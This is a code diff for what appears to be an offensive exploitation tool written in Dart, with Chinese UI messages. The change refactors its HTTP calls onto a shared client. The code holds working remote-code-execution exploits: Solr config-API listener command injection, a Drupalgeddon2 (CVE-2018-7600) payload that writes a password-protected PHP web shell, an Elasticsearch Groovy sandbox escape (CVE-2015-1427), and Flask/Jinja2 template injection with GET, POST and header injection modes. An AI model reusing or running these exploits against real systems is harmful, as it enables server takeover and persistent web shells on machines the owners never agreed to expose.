@@ -1,8 +1,8 @@
 import 'dart:convert';
 
-import 'package:http/http.dart' as http;
-
 import '../../../app/constants.dart';
+import '../../../core/http/http_client.dart';
+import '../../../core/http/http_result.dart';
 import 'exp_result.dart';
 import 'rce_encoder.dart';
 
@@ -21,6 +21,12 @@ class SolrExpService {
       ? baseUrl.substring(0, baseUrl.length - 1)
       : baseUrl;
 
+  late final MatrixHttpClient _httpClient = MatrixHttpClient(
+    baseUrl: baseUrl,
+    timeout: timeout,
+    allowBadCertificate: false,
+  );
+
   Future<ExpResult> check() async {
     try {
       final listenerPayload = jsonEncode({
@@ -33,20 +39,16 @@ class SolrExpService {
           'args': ['-c', 'echo solr_check_54289'],
         },
       });
-      final configRes = await http
-          .post(
-            Uri.parse('$_base/solr/$coreName/config'),
-            headers: {'Content-Type': 'application/json'},
-            body: listenerPayload,
-          )
-          .timeout(timeout);
-      final updateRes = await http
-          .post(
-            Uri.parse('$_base/solr/$coreName/update'),
-            headers: {'Content-Type': 'application/json'},
-            body: '[{"id":"check_trigger_54289"}]',
-          )
-          .timeout(timeout);
+      final configRes = await _httpClient.post(
+        '$_base/solr/$coreName/config',
+        headers: {'Content-Type': 'application/json'},
+        body: listenerPayload,
+      );
+      final updateRes = await _httpClient.post(
+        '$_base/solr/$coreName/update',
+        headers: {'Content-Type': 'application/json'},
+        body: '[{"id":"check_trigger_54289"}]',
+      );
 
       if ((configRes.statusCode == 200 || configRes.statusCode == 201) &&
           (updateRes.statusCode == 200 || updateRes.statusCode == 201)) {
@@ -72,38 +74,32 @@ class SolrExpService {
         'args': ['-c', RceEncoder.shellBase64Wrap(cmd)],
       };
 
-      var configRes = await http
-          .post(
-            Uri.parse('$_base/solr/$coreName/config'),
-            headers: {'Content-Type': 'application/json'},
-            body: jsonEncode({'add-listener': listener}),
-          )
-          .timeout(timeout);
+      var configRes = await _httpClient.post(
+        '$_base/solr/$coreName/config',
+        headers: {'Content-Type': 'application/json'},
+        body: jsonEncode({'add-listener': listener}),
+      );
 
       // Solr returns HTTP 200 even when add-listener fails because the name
       // already exists; detect this by inspecting the response body and
       // retry with update-listener.
-      if (configRes.body.contains('already exists')) {
-        configRes = await http
-            .post(
-              Uri.parse('$_base/solr/$coreName/config'),
-              headers: {'Content-Type': 'application/json'},
-              body: jsonEncode({'update-listener': listener}),
-            )
-            .timeout(timeout);
+      if ((configRes.body ?? '').contains('already exists')) {
+        configRes = await _httpClient.post(
+          '$_base/solr/$coreName/config',
+          headers: {'Content-Type': 'application/json'},
+          body: jsonEncode({'update-listener': listener}),
+        );
       }
 
-      await http
-          .post(
-            Uri.parse('$_base/solr/$coreName/update'),
-            headers: {'Content-Type': 'application/json'},
-            body: '[{"id":"rce_trigger"}]',
-          )
-          .timeout(timeout);
+      await _httpClient.post(
+        '$_base/solr/$coreName/update',
+        headers: {'Content-Type': 'application/json'},
+        body: '[{"id":"rce_trigger"}]',
+      );
 
-      final commitRes = await http
-          .get(Uri.parse('$_base/solr/$coreName/update?commit=true'))
-          .timeout(timeout);
+      final commitRes = await _httpClient.get(
+        '$_base/solr/$coreName/update?commit=true',
+      );
       return '命令已发送 (commit 状态: ${commitRes.statusCode})。注意：Solr RCE 无回显，请用 OOB 或写文件验证。';
     } catch (_) {
       return null;
@@ -124,6 +120,12 @@ class DrupalExpService {
       ? baseUrl.substring(0, baseUrl.length - 1)
       : baseUrl;
 
+  late final MatrixHttpClient _httpClient = MatrixHttpClient(
+    baseUrl: baseUrl,
+    timeout: timeout,
+    allowBadCertificate: false,
+  );
+
   Future<String?> getShell(
     String shellContent, {
     String password = AppConstants.defaultShellPassword,
@@ -136,17 +138,13 @@ class DrupalExpService {
           "php -r 'file_put_contents(\"$shellFile\", base64_decode(\"$shellB64\"));'";
       final payload =
           'form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=${Uri.encodeQueryComponent(phpCmd)}';
-      await http
-          .post(
-            Uri.parse(
-              '$_base/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax',
-            ),
-            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-            body: payload,
-          )
-          .timeout(timeout);
+      await _httpClient.post(
+        '$_base/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax',
+        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+        body: payload,
+      );
       final checkUrl = '$_base/$shellFile';
-      final check = await http.get(Uri.parse(checkUrl)).timeout(timeout);
+      final check = await _httpClient.get(checkUrl);
       if (check.statusCode == 200) return '$checkUrl Pass:$password';
       return null;
     } catch (_) {
@@ -190,17 +188,13 @@ class DrupalExpService {
     try {
       const payload =
           'form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id';
-      final res = await http
-          .post(
-            Uri.parse(
-              '$_base/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax',
-            ),
-            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-            body: payload,
-          )
-          .timeout(timeout);
-      if (res.body.contains('uid=') ||
-          (res.statusCode == 200 && res.body.contains('['))) {
+      final res = await _httpClient.post(
+        '$_base/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax',
+        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+        body: payload,
+      );
+      final body = res.body ?? '';
+      if (body.contains('uid=') || (res.statusCode == 200 && body.contains('['))) {
         return ExpResult(
           true,
           'CVE-2018-7600 (Drupalgeddon2)',
@@ -225,16 +219,12 @@ class DrupalExpService {
       final safeCmd = _buildSafeCommand(cmd);
       final payload =
           'form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=${Uri.encodeQueryComponent(safeCmd)}';
-      final res = await http
-          .post(
-            Uri.parse(
-              '$_base/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax',
-            ),
-            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-            body: payload,
-          )
-          .timeout(timeout);
-      final out = _parseOutput(res.body);
+      final res = await _httpClient.post(
+        '$_base/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax',
+        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+        body: payload,
+      );
+      final out = _parseOutput(res.body ?? '');
       if (out == null || out.isEmpty) return null;
       // 先尝试把执行结果当 base64 解码，还原原始输出。失败则返回原串。
       try {
@@ -262,16 +252,20 @@ class ElasticsearchExpService {
       ? baseUrl.substring(0, baseUrl.length - 1)
       : baseUrl;
 
+  late final MatrixHttpClient _httpClient = MatrixHttpClient(
+    baseUrl: baseUrl,
+    timeout: timeout,
+    allowBadCertificate: false,
+  );
+
   Future<ExpResult> check() async {
     try {
       // 先创建临时文档确保有数据
-      await http
-          .post(
-            Uri.parse('$_base/matrix_check/doc/1'),
-            headers: {'Content-Type': 'application/json'},
-            body: jsonEncode({'check': 'data'}),
-          )
-          .timeout(timeout);
+      await _httpClient.post(
+        '$_base/matrix_check/doc/1',
+        headers: {'Content-Type': 'application/json'},
+        body: jsonEncode({'check': 'data'}),
+      );
 
       final payload = jsonEncode({
         'size': 1,
@@ -281,14 +275,13 @@ class ElasticsearchExpService {
           },
         },
       });
-      final res = await http
-          .post(
-            Uri.parse('$_base/_search?pretty'),
-            headers: {'Content-Type': 'application/json'},
-            body: payload,
-          )
-          .timeout(timeout);
-      if (res.body.contains('54289')) {
+      final res = await _httpClient.post(
+        '$_base/_search?pretty',
+        headers: {'Content-Type': 'application/json'},
+        body: payload,
+      );
+      final body = res.body ?? '';
+      if (body.contains('54289')) {
         return ExpResult(true, 'CVE-2015-1427', 'Groovy 沙箱逃逸，echo 54289 验证通过');
       }
     } catch (_) {}
@@ -298,13 +291,11 @@ class ElasticsearchExpService {
   Future<String?> execRce(String cmd) async {
     try {
       // 先创建临时文档确保有数据
-      await http
-          .post(
-            Uri.parse('$_base/matrix_exec/doc/1'),
-            headers: {'Content-Type': 'application/json'},
-            body: jsonEncode({'exec': 'data'}),
-          )
-          .timeout(timeout);
+      await _httpClient.post(
+        '$_base/matrix_exec/doc/1',
+        headers: {'Content-Type': 'application/json'},
+        body: jsonEncode({'exec': 'data'}),
+      );
 
       final cmdBytes = RceEncoder.groovyByteArray(cmd);
       final payload = jsonEncode({
@@ -316,25 +307,24 @@ class ElasticsearchExpService {
           },
         },
       });
-      final res = await http
-          .post(
-            Uri.parse('$_base/_search?pretty'),
-            headers: {'Content-Type': 'application/json'},
-            body: payload,
-          )
-          .timeout(timeout);
+      final res = await _httpClient.post(
+        '$_base/_search?pretty',
+        headers: {'Content-Type': 'application/json'},
+        body: payload,
+      );
+      final body = res.body ?? '';
       if (res.statusCode == 200) {
         try {
-          final decoded = jsonDecode(res.body);
+          final decoded = jsonDecode(body);
           final hits = decoded['hits']?['hits'] as List?;
           if (hits != null && hits.isNotEmpty) {
             return hits.first['fields']?['result']?.first?.toString() ??
-                res.body;
+                body;
           }
         } catch (e) {
-          return res.body;
+          return body;
         }
-        return res.body;
+        return body;
       }
     } catch (e) {
       return null;
@@ -368,18 +358,22 @@ class FlaskSstiExpService {
       ? baseUrl.substring(0, baseUrl.length - 1)
       : baseUrl;
 
-  Future<http.Response> _send(String payload) {
+  late final MatrixHttpClient _httpClient = MatrixHttpClient(
+    baseUrl: baseUrl,
+    timeout: timeout,
+    allowBadCertificate: false,
+  );
+
+  Future<HttpResult> _send(String payload) {
     final baseUri = Uri.parse('$_base/');
     final headers = Map<String, String>.from(extraHeaders);
 
     switch (injectMode) {
       case SstiInjectMode.get:
-        return http
-            .get(
-              Uri.parse('$_base/?$paramName=${Uri.encodeComponent(payload)}'),
-              headers: headers,
-            )
-            .timeout(timeout);
+        return _httpClient.get(
+          Uri.parse('$_base/?$paramName=${Uri.encodeComponent(payload)}').toString(),
+          headers: headers,
+        );
 
       case SstiInjectMode.post:
         final body = rawBody.isNotEmpty
@@ -392,23 +386,28 @@ class FlaskSstiExpService {
                   ? 'application/json'
                   : 'application/x-www-form-urlencoded';
         }
-        return http
-            .post(baseUri, headers: headers, body: body)
-            .timeout(timeout);
+        return _httpClient.post(
+          baseUri.toString(),
+          headers: headers,
+          body: body,
+        );
 
       case SstiInjectMode.header:
         // {{INJECT}} 占位符替换 header 值
         for (final key in headers.keys.toList()) {
           headers[key] = headers[key]!.replaceAll('{{INJECT}}', payload);
         }
-        return http.get(baseUri, headers: headers).timeout(timeout);
+        return _httpClient.get(
+          baseUri.toString(),
+          headers: headers,
+        );
     }
   }
 
   Future<ExpResult> check() async {
     try {
       final res = await _send('{{233*233}}');
-      if (res.body.contains('54289')) {
+      if ((res.body ?? '').contains('54289')) {
         return ExpResult(
           true,
           'Flask/Jinja2 SSTI',
@@ -470,7 +469,7 @@ class FlaskSstiExpService {
       try {
         final res = await _send(payload);
         if (res.statusCode == 200) {
-          final out = _extract(res.body);
+          final out = _extract(res.body ?? '');
           if (out != null) return out;
         }
       } catch (_) {}
